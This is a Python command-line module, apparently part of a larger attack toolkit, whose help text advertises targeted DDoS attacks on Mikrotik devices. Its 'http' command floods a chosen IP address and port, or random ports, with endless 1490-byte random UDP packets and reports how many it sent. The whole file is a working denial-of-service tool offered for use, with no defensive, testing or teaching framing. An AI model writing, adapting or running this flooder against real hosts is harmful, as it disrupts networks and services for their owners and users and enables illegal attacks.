import random as random_m
import socket
from datetime import datetime
from typing import Annotated

import typer

# WARNING: Running rich color printing during the attack causes a significant
# performance loss, which is why the ANSI character method was adopted.

RESET = '\033[0m'
BOLD = '\033[1m'
RED = '\033[31m'
YELLOW = '\033[33m'
GREEN = '\033[32m'

command = typer.Typer(
    help='Perform targeted DDoS attacks on Mikrotik devices',
    no_args_is_help=True,
)


@command.command()
def http(
    target: Annotated[
        str, typer.Argument(help='Target IP address or domain.')
    ],
    port: Annotated[int, typer.Argument(help='TCP port to be attacked.')] = 80,
    random: Annotated[
        bool,
        typer.Option(
            '--random', '-r', help='Attacks random ports between 1 and 65534.'
        ),
    ] = False,
    verbose: Annotated[
        bool,
        typer.Option('--verbose', '-v', help='Enable verbosity.'),
    ] = False,
):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random_m._urandom(1490)
    target = socket.gethostbyname(target)

    print(
        f'{BOLD}{YELLOW}[{RESET}'
        f'{BOLD}{RED}+{RESET}'
        f'{BOLD}{YELLOW}]{RESET}'
        f' Attacking the target {BOLD}{RED}{target}{RESET}'
    )
    print(
        f'{BOLD}{YELLOW}[{RESET}'
        f'{BOLD}{RED}+{RESET}'
        f'{BOLD}{YELLOW}]{RESET}'
        f' Prees {BOLD}{RED}Ctrl{RESET}'
        f'+{BOLD}{RED}C{RESET} to stop'
    )

    sent = 0
    start_time = datetime.now()
    while True:
        try:
            if random:
                port = random_m.randrange(1, 65535)

            sock.sendto(bytes, (target, port))
            sent += 1
            if verbose:
                print(
                    f'{BOLD}{RED}[{RESET}'
                    f'{BOLD}{YELLOW}*{RESET}'
                    f'{BOLD}{RED}]{RESET}'
                    f' Sent {BOLD}{RED}{sent}{RESET} '
                    f'to traget {BOLD}{RED}{target}{RESET}'
                    f':{BOLD}{RED}{port}{RESET}'
                )
        except KeyboardInterrupt:
            print(
                f'\n{BOLD}{GREEN}[{RESET}'
                f'{BOLD}{YELLOW}-{RESET}'
                f'{BOLD}{GREEN}]{RESET}'
                f' Stopping'
            )
            end_time = datetime.now()
            break
    execution_time = end_time - start_time
    print(
        f'{BOLD}{GREEN}[{RESET}'
        f'{BOLD}{YELLOW}+{RESET}'
        f'{BOLD}{GREEN}]{RESET}'
        f' The attack lasted {BOLD}{RED}{execution_time}{RESET} '
        f'and sent {BOLD}{RED}{sent}{RESET} packets'
    )
    typer.Exit(0)
